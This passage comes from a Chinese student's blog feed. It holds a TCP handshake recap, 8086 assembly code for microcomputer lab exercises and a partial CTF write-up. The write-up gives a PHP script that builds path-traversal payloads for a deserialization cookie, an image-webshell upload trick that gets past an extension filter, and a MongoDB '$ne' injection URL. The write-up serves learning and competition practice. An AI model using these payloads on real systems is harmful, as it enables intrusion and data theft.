代表客户端请求建立连接</p><p><strong>第二次握手的数据包</strong><br>服务器发回确认包, 标志位为 SYN,ACK. 将确认序号(Acknowledgement Number)设置为客户的I S N加1,即0+1=1, 如下图<br><a href="https://imgchr.com/i/P3I978" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3I978.md.png" alt="P3I978.md.png"></a></p><p><strong>第三次握手的数据包</strong><br>客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK 的序号字段+1,放在确定字段中发送给对方,如下图:<br><a href="https://imgchr.com/i/P3Iitg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Iitg.md.png" alt="P3Iitg.md.png"></a><br>就这样通过了TCP三报文握手，建立了连接</p><p>小小回顾，感觉废话太多，emmm。。。</p>]]></content>
      
      <categories>
          
          <category> 计算机网路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网路 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>微机实验考试</title>
      <link href="/2018/07/08/weiji-exam/"/>
      <url>/2018/07/08/weiji-exam/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本以为微机实验会很难很难(因为周围有几个同学都说没做完，emmm)，于是就一直在搜集前面同学考过的题目来看，复习得神经兮兮的。。。<a id="more"></a>结果手气太好，抽到一条类似的题目，反正吧，看了这么多题目，感觉这最后的考试就是大杂烩，把以前做过的芯片做个排列组和，感觉就是他的题库了。。。就是8255，8253，0832，0809加上4*4键盘，还有各种奇葩输出，输出到LED，蜂鸣器，直流电动机等等</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>不多说，先放上一波考试题目<br><img src="https://s1.ax1x.com/2018/07/08/Pe5shT.png" alt="Pe5shT.png"><br>我比较懒，就随意记录一下思考过程吧，画的脑图太丑，就不挂上来了<br>首先要实现简单的硬延时跑马灯，这里就要涉及到8253以及8255，移动到第6位的时候就要开启跳转了，跳转到蜂鸣器，这里又得用到一次8253延时，响完之后就得关闭，然后重新跳转到跑马灯的实现过程中了。。思路很清晰，LED-&gt;蜂鸣器-&gt;LED</p><p>于是在队友的帮助下开始写代码。。代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">CODE SEGMENT</span><br><span class="line">ASSUME CS:CODE</span><br><span class="line">START:</span><br><span class="line">MOV AL,35H     </span><br><span class="line">MOV DX,293H    ;控制口</span><br><span class="line">OUT DX,AL      ;输出控制字</span><br><span class="line">MOV AL,00H     ;低字节</span><br><span class="line">MOV DX,290H    ;通道0口</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,20H     ;高字节</span><br><span class="line">OUT DX,AL</span><br><span class="line">                   ;级联</span><br><span class="line">MOV AL,77H     </span><br><span class="line">MOV DX,293H    </span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,291H    ;通道1口</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,20H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line">MOV DX,283H    ;8255控制口</span><br><span class="line">MOV AL,10010000B     </span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV BL,80H     ;初始化</span><br><span class="line">LIGHT1:</span><br><span class="line">MOV DX,280H    ;A口输入</span><br><span class="line">IN AL,DX</span><br><span class="line">AND AX,01H     ;和00000001与保留最低位</span><br><span class="line">CMP AL,01H     ;比较最低位</span><br><span class="line">JZ DOWN       ;高电平不亮</span><br><span class="line">MOV DX,282H    ;低电平时C口输出</span><br><span class="line">MOV AL,BL</span><br><span class="line">OUT DX,AL      ;输出</span><br><span class="line">TEST AL,4H      ;检测是否到达第六位</span><br><span class="line">JNZ XIANG       ;是第六位的话就响</span><br><span class="line">WAN:ROR BL,1       </span><br><span class="line">ON:</span><br><span class="line">MOV DX,280H    ;A口输入</span><br><span class="line">IN AL,DX</span><br><span class="line">AND AX,01H     </span><br><span class="line">CMP AL,01H     ;比较最低位是否为1</span><br><span class="line">JNZ ON        </span><br><span class="line">DOWN:</span><br><span class="line">MOV DX,280H    ;A口输入</span><br><span class="line">IN AL,DX</span><br><span class="line">AND AX,01H</span><br><span class="line">CMP AL,0H      ;比较最低位是否为0</span><br><span class="line">JNZ DOWN        </span><br><span class="line">JMP LIGHT1     ;最低位为0时跳到LIGHT1</span><br><span class="line">XIANG: MOV DX,281H</span><br><span class="line"> MOV AL,01H</span><br><span class="line">  OUT DX,AL</span><br><span class="line"> </span><br><span class="line">MOV AL,35H     </span><br><span class="line">MOV DX,293H    ;控制口</span><br><span class="line">OUT DX,AL      ;输出控制字</span><br><span class="line">MOV AL,00H     ;低字节</span><br><span class="line">MOV DX,290H    ;通道0口</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,20H     ;高字节</span><br><span class="line">OUT DX,AL</span><br><span class="line">                   ;级联</span><br><span class="line">MOV AL,11110001B    </span><br><span class="line">MOV DX,293H    </span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,291H    ;通道1口</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,10H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line">CHK:MOV DX,280H</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H ;检测是否到达高电频</span><br><span class="line">JZ CHK       ;不是就继续监测，是就关闭蜂鸣器</span><br><span class="line"> MOV AL,0H</span><br><span class="line"> MOV DX,281H</span><br><span class="line">  OUT DX,AL     </span><br><span class="line"> JMP WAN     ;然后跳回跑马灯执行程序</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>先得谢谢两位队友的鼎力相助，因为他们，我完成了实验报告，因为本人不喜欢写实验报告，哈哈哈。。。<br>从这次考试里面又加深一波自己对于8253工作与各种方式下的应用，在这次考试里面确实只能用方式3或者是方式0，方式4是不能用的，方式4还得处理GATE信号会有点麻烦，一般都不会使用，所以这里推测期末考试很大可能性考方式0，方式2以及方式3？常规期末考试押题套路，猥琐地笑了。。。在这里方式2是不能用的，会少了一个CLK，这还是老师答辩的时候发现我的问题，emmmm….<br>顺便吐槽一下每次跟微机老师交流都会小紧张，语速极其快的问答让我的大脑超频工作，这样才能跟上他的节奏，这也从侧面反映了自己基础还是不牢靠，赶紧抓紧时间复习，下周五得考试了</p>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> 微机实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> 微机实验 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>微机实验记录</title>
      <link href="/2018/06/24/weiji-experiment/"/>
      <url>/2018/06/24/weiji-experiment/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实验说简单不简单说难也不难。。最主要是自己理论不扎实，得记录，昨天把安恒6月赛的wp写完头疼，于是就放到今天赶脚写一写，注意的点都在代码的注释里面标着，趁着自己还记得emmm<br><a id="more"></a></p><h3 id="跑马灯硬件延时"><a href="#跑马灯硬件延时" class="headerlink" title="跑马灯硬件延时"></a>跑马灯硬件延时</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">PORT_CTL EQU 283H</span><br><span class="line">PORT_A EQU 280H</span><br><span class="line">PORT_B EQU 281H</span><br><span class="line">PORT_C EQU 282H</span><br><span class="line"></span><br><span class="line">;8255的控制端口</span><br><span class="line">;8255的A口接的是8253的输出</span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">ASSUME CS:CODE</span><br><span class="line">START:</span><br><span class="line">MOV AL,00110111B;  TO:2A0H T1:2A1H T2:2A2H   通道0初始化写入控制字</span><br><span class="line">MOV DX,2A3H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,2A0H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,50H</span><br><span class="line">MOV DX,2A0H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line">MOV AL,01110111B</span><br><span class="line">MOV DX,2A3H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,00H</span><br><span class="line">MOV DX,2A1H</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV AL,4H       </span><br><span class="line">MOV DX,2A1H</span><br><span class="line">OUT DX,AL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;上面这一部分是对8253的控制，分别对0和1口进行输入计数值，对控制口输入控制字</span><br><span class="line"></span><br><span class="line">MOV DX,PORT_CTL</span><br><span class="line">MOV AL,10010000B</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV BL,01H  ;亮灯的信号</span><br><span class="line"></span><br><span class="line">TEST_IT:</span><br><span class="line">MOV DX,PORT_A</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H</span><br><span class="line">JNZ ON1</span><br><span class="line">;注意这里的逻辑顺序，不为0的时候是走ON2的，不能先写ON1，不然跑马灯的逻辑就会出错，就会变成不论判断与否都是执行ON1</span><br><span class="line">ON2:  </span><br><span class="line">MOV AL,BL</span><br><span class="line">MOV DX,PORT_B</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV DX,PORT_A</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H      ;读取最后一位的值来判断是否在跳动</span><br><span class="line">JZ ON2            ;注意这种地方的逻辑判断</span><br><span class="line">ROL BL,01</span><br><span class="line">JMP TEST_IT</span><br><span class="line"></span><br><span class="line">ON1:</span><br><span class="line">MOV AL,BL</span><br><span class="line">MOV DX,PORT_B</span><br><span class="line">OUT DX,AL</span><br><span class="line">MOV DX,PORT_A</span><br><span class="line">IN AL,DX</span><br><span class="line">TEST AL,01H</span><br><span class="line">JNZ ON1             ;注意这种地方的逻辑判断</span><br><span class="line">ROL BL,01</span><br><span class="line">JMP TEST_IT      </span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br><span class="line">;END START一定要加不然的话也会报错</span><br></pre></td></tr></table></figure><p>通过高低电频的切换效果，对比一下上次的软件实现双从循环来延时</p><h3 id="跑马灯软件延时"><a href="#跑马灯软件延时" class="headerlink" title="跑马灯软件延时"></a>跑马灯软件延时</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">;端口地址</span><br><span class="line">PORTA  EQU 280H</span><br><span class="line">PORTB EQU 281H</span><br><span class="line">PORTC EQU 282H</span><br><span class="line">PORT_CRO EQU 283H</span><br><span class="line"></span><br><span class="line">CODE SEGMENT</span><br><span class="line">   ASSUME CS:CODE</span><br><span class="line">        </span><br><span class="line">START:MOV AL,82H</span><br><span class="line">MOV DX ,PORT_CRO</span><br><span class="line"> OUT DX, AL</span><br><span class="line">   MOV AL,01H</span><br><span class="line">MOV DX,PORTA</span><br><span class="line">;同样是上面是对于8255端口的操作，A口作为输出口</span><br><span class="line">GO:</span><br><span class="line">OUT DX,AL</span><br><span class="line">ROL AL,1 ;下面就开始使用双重循环延时，相当于移位之后，就一直停在那一位等</span><br><span class="line">      MOV BX, 16EAH</span><br><span class="line">DELAY1:</span><br><span class="line">MOV CX, 16EAH</span><br><span class="line">DELAY: </span><br><span class="line">LOOP DELAY</span><br><span class="line">DEC BX</span><br><span class="line">JNZ DELAY1</span><br><span class="line">JMP GO</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure><p>对比上面两个跑马灯的实验，不同之处就是延时部分的操作啊</p><h3 id="4-4键盘输入"><a href="#4-4键盘输入" class="headerlink" title="4*4键盘输入"></a>4*4键盘输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">  ;端口地址</span><br><span class="line">PORT_A EQU 280H          ;8255 A口地址</span><br><span class="line">PORT_B EQU 281H           ;8255 B口地址</span><br><span class="line">PORT_C EQU 282H           ;8255 C口地址</span><br><span class="line">PORT_CTL EQU 283H   </span><br><span class="line"></span><br><span class="line">;数据段，键盘扫描码表</span><br><span class="line">DATA SEGMENT</span><br><span class="line">;         0    1    2     3     4      5     6     7</span><br><span class="line">KEY_TABLE DB  77H, 7BH , 7DH, 7EH, 0B7H, 0BBH, 0BDH, 0BEH</span><br><span class="line">;         8      9     A     B     C      D E F</span><br><span class="line">      DB  0D7H, 0DBH, 0DDH, 0DEH , 0E7H, 0EBH, 0EDH, 0EEH</span><br><span class="line">;七段码</span><br><span class="line">;                0    1    2    3    4     5    6     7</span><br><span class="line">SEVEN_TABLE DB   3FH, 06H, 5BH, 4FH, 66H, 6DH, 7DH, 07H</span><br><span class="line">  ;               8     9   A   B   C   D    E     F</span><br><span class="line">             DB   7FH,6FH,77H,7CH，39h, 5EH, 79h,  71h, 0ffh </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;代码段</span><br><span class="line">CODE SEGMENT</span><br><span class="line">     ASSUME CS:CODE,DS:DATA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">START:</span><br><span class="line">  MOV AX, DATA</span><br><span class="line">  MOV DS, AX</span><br><span class="line">  ;初始化8255A,  方式0  B口输入  A，C口输出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  MOV DX, PORT_CTL ;指向控制字</span><br><span class="line">  MOV AL, 82H ;控制字</span><br><span class="line">  OUT DX, AL          ;写入控制字</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;检测开始</span><br><span class="line">;向所有行送0</span><br><span class="line">Go:</span><br><span class="line">  MOV DX, PORT_A   ;A口</span><br><span class="line">  MOV AL, 00H</span><br><span class="line">  OUT DX, AL ;向A口输出0</span><br><span class="line"></span><br><span class="line">;读列，查看是否所有键均松开</span><br><span class="line">  MOV DX, PORT_B</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WAIT_OPEN:</span><br><span class="line">  IN AL, DX</span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL,0FH</span><br><span class="line">  JNE WAIT_OPEN  </span><br><span class="line"></span><br><span class="line">;是否有键压下</span><br><span class="line">WAITP:</span><br><span class="line">  IN AL,DX</span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL,0FH</span><br><span class="line">  JZ WAITP</span><br><span class="line"></span><br><span class="line">;有键压下，延时20ms，消除抖动</span><br><span class="line">  MOV CX, 16EAH</span><br><span class="line">DELAY:</span><br><span class="line">  LOOP DELAY</span><br><span class="line"></span><br><span class="line">;查列，看键是否仍然被压着</span><br><span class="line">  IN AL, DX</span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL, 0FH</span><br><span class="line">  JE WAITP</span><br><span class="line"></span><br><span class="line">  MOV AL, 0FEH</span><br><span class="line">  MOV CL, AL</span><br><span class="line"></span><br><span class="line">NEXTR:</span><br><span class="line">  MOV DX, PORT_A</span><br><span class="line">  OUT DX, AL</span><br><span class="line">  MOV DX ,PORT_B</span><br><span class="line">  IN AL, DX </span><br><span class="line">  AND AL, 0FH</span><br><span class="line">  CMP AL, 0FH</span><br><span class="line">  JNE ENCODE</span><br><span class="line">  ROL CL, 01</span><br><span class="line">  MOV AL,CL</span><br><span class="line">  JMP NEXTR</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ENCODE:</span><br><span class="line">  MOV BX, 000FH</span><br><span class="line">  IN AL, DX</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NEXT_TRY:</span><br><span class="line">  CMP AL, KEY_TABLE[BX]</span><br><span class="line">  JE DONE</span><br><span class="line">  DEC BX</span><br><span class="line">  JNS NEXT_TRY</span><br><span class="line">  MOV AH, 01</span><br><span class="line">  JMP EXIT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DONE:</span><br><span class="line">  MOV AL, BL</span><br><span class="line">  LEA BX, SEVEN_TABLE;</span><br><span class="line">  XLAT</span><br><span class="line">  MOV DX, PORT_C</span><br><span class="line">  OUT DX, AL</span><br><span class="line">  JMP Go </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXIT:</span><br><span class="line">  HLT</span><br><span class="line"></span><br><span class="line">CODE ENDS</span><br><span class="line">END START</span><br></pre></td></tr></table></figure><p>这个4*4说来就很水，很大一部分抄的书，只是最后那里换了查七段表而已</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.各种控制字段记得还不够熟悉，有时还是需要翻书。。<br>2.各种器件的名字及功能原理记得也不牢固，昨天翻书发现原理的部分，还是很有欠缺的<br>3.硬件方面不行，软件方面也不行，汇编语言还是不够熟练，特别是对于逻辑判断和跳转顺序的编写，下次要不把<code>74ls138</code>端口换一换？在尝试自己写。。说来说去都是自己理论知识不扎实，下午赶紧找时间去恶补了</p>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> 微机实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> 微机实验 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安恒6月赛部分做题记录</title>
      <link href="/2018/06/23/anheng-6month/"/>
      <url>/2018/06/23/anheng-6month/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛恰逢别的学校考试，感觉题目有点水，但还是得记录一下<br><a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Web1-Mynote"><a href="#Web1-Mynote" class="headerlink" title="Web1 Mynote"></a>Web1 Mynote</h3><p>这道题目一开始我死扣xss发现无路可循后面经别人小小提醒之后，原来是个炒鸡弱智的反序列化题目，不多说<br>上图，在<code>robots.txt</code>里面发现几个可疑的页面，可能有用先记录着，直接访问<code>flag.php</code>是个假的flag。。<br><img src="https://s1.ax1x.com/2018/06/23/P9MVuq.png" alt="P9MVuq.png"></p><p>经过别人的提示，是反序列化以后，多抓几个包看一下<br>在<code>upload页面</code>上传图片文件，然后返回查看图片的页面发现里面多了一个关于<code>picture</code>参数的<code>cookie</code><br><img src="https://s1.ax1x.com/2018/06/23/P9MebV.png" alt="P9MebV.png"></p><p>解码发现是个<code>json格式</code>的东西<br><a href="https://imgchr.com/i/P9MuUU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9MuUU.md.png" alt="P9MuUU.md.png"></a><br>这就跟反序列化联系起来了，这是一个数组类型的反序列化但直接反序列化会有报错，如下<br><img src="https://s1.ax1x.com/2018/06/23/P9MK5F.png" alt="P9MK5F.png"><br>发现是在当前目录用的函数读取页面，于是就要目录穿越一波，于是便有了下面的操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> $a[] = <span class="string">'../../controllers/Basecontrol.php'</span>;</span><br><span class="line"> $b[] = <span class="string">'../../flag.php'</span>;</span><br><span class="line"> $c[] = <span class="string">'../../controllers/User.php'</span>;</span><br><span class="line"> $d[] = <span class="string">'../../controllers/Controllers.php.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($a)));</span><br></pre></td></tr></table></figure><p>把他们一个个弄到<code>picture</code>的<code>cookie</code>里面，把回显出来的<code>base64编码</code>一遍遍解码，得到源码，起初一直以为后续还要代码审计。。。结果解码flag.php的源码的时候出现了真的<code>flag</code>。。。。。尼玛坑爹，都做好审计准备了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;N4me_sPac4_Is_Int3r3st1ng&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;This_1S_A_F4ke_f1aG&#125;"</span>;</span><br></pre></td></tr></table></figure><p>以后看来要勤抓包</p><h3 id="Web2-ezupload"><a href="#Web2-ezupload" class="headerlink" title="Web2 ezupload"></a>Web2 ezupload</h3><p>简单的上传题目<br>先随意上传一个文件发现只能上传图片，那我就用copy命令弄一个图片马上去<br>上传发现<br><img src="https://s1.ax1x.com/2018/06/23/P9MQC4.png" alt="P9MQC4.png"><br>出现路径，网页可以打开，但这个后缀名有点奇怪于是我继续尝试改后缀名为<code>phtml</code>,发现名称又变成了<code>pegml</code><br><img src="https://s1.ax1x.com/2018/06/23/P9M129.png" alt="P9M129.png"><br>于是猜测是否可能是之过滤前三个字母后缀名，这样就可以利用<code>Apache</code>的特性让他执行php代码，于是我把后缀名再改为<code>phtml.php</code>,这次的后缀名变成<code>pegml.php</code>前面的东西<code>Apache</code>肯定不认得，只能乖乖执行PHP了。。<br>于是连一下菜刀成功<br><a href="https://imgchr.com/i/P9M3vR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/06/23/P9M3vR.md.png" alt="P9M3vR.md.png"></a></p><h3 id="Web3-never-give-up"><a href="#Web3-never-give-up" class="headerlink" title="Web3 never give up"></a>Web3 never give up</h3><p>这个题目是<code>mongdb注入</code>，好像大神们都做过啊，就我这渣渣没见过。。。。直接贴图<br><img src="https://s1.ax1x.com/2018/06/23/P9MJDx.png" alt="P9MJDx.png"></p><p>查看页面原代码发现几个页面有<code>title参数</code>，就是他了<br><code>payload</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10000/?title[$ne]=1</span><br></pre></td></tr></table></figure></p><p>原因好像是$ne这个东西有缺陷，<br>此类攻击是在条件语句中注入代码,使生成的表达式判定结果永远为真,从而绕过认证或访问机制<br>因为<code>$ne</code>是<code>MongoDB</code>用来判定条件是否不相等的,所以它会查询登录集合中的所有用户名称不等于1且密码也不等于1的记录。因此,本次查询将返回登录集合中的所有用户。换成SQL的表述法,就等同于以下查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> logins <span class="keyword">WHERE</span> username &lt;&gt;   <span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">password</span> &lt;&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="MISC"><a href="#MISC" class="headerlink" 